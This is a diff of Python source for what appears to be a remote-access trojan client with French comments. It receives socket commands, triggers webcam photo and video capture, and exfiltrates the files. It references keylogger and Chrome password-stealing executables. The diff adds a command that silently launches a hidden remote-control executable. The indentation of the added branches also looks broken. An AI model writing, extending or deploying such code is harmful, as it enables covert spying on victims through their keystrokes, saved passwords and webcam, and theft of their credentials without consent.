@@ -18,7 +18,7 @@ KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
 PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
 WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
 KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
-WEBCAM_FILE = os.path.join(BASE_DIR, "webcam_capture.jpg")
+REMOTE_EXE= os.path.join(BASE_DIR, "remote.exe")
 
 def send_file(client_socket, file_path, file_type):
     try:
@@ -49,26 +49,6 @@ def wait_for_file(file_path, timeout=10):
         time.sleep(1)
     return True
 
-# def handle_commands(client_socket):
-#     try:
-#         while True:
-#             command = client_socket.recv(1024).decode('utf-8')
-
-#             if command == "keylogger":
-#                 if wait_for_file(KEYLOG_FILE):
-#                     send_file(client_socket, KEYLOG_FILE, "keystroke")
-#                 else:
-#                     print(f"[-] Le fichier keylogger est introuvable après l'attente.")
-
-#             elif command == "webcam":
-#                 subprocess.run([WEBCAM_EXE], check=True)
-#                 if wait_for_file(WEBCAM_FILE):
-#                     send_file(client_socket, WEBCAM_FILE, "webcam_capture")
-#                 else:
-#                     print(f"[-] Le fichier de la webcam est introuvable après l'attente.")
-#     except Exception as e:
-#         print(f"[Erreur] de connexion : {e}")
-
 def handle_commands(client_socket):
     try:
         while True:
@@ -82,7 +62,7 @@ def handle_commands(client_socket):
                 subprocess.run([WEBCAM_EXE, "image"], check=True)
                 capture_folder = os.path.join(BASE_DIR, "captures")
 
-                # Récupère le fichier image le plus récent
+                #Recup de l'image
                 images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("webcam_capture_") and f.endswith(".jpg")]
                 if not images:
                     print("Aucune image trouvée")
@@ -94,11 +74,25 @@ def handle_commands(client_socket):
                     send_file(client_socket, latest_image, "webcam_capture")
 
 
-            elif command == "capture_video":
-                subprocess.run([WEBCAM_EXE, "video"], check=True)
-                video_file = os.path.join(BASE_DIR, "captures", "webcam_video.avi")
-                if wait_for_file(video_file):
-                    send_file(client_socket, video_file, "webcam_capture")
+                elif command == "capture_video":
+                    subprocess.run([WEBCAM_EXE, "video"], check=True)
+                    capture_folder = os.path.join(BASE_DIR, "captures")
+
+                    #Recup last vidéo
+                    videos = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("webcam_video_") and f.endswith(".avi")]
+                    if not videos:
+                        print("Aucune vidéo trouvée")
+                        return
+
+                    latest_video = max(videos, key=os.path.getctime)
+
+                    if wait_for_file(latest_video):
+                        send_file(client_socket, latest_video, "webcam_capture")
+                
+                elif command == "remote":
+                    subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+
+
     except Exception as e:
         print(f"[Erreur] de connexion : {e}")
 
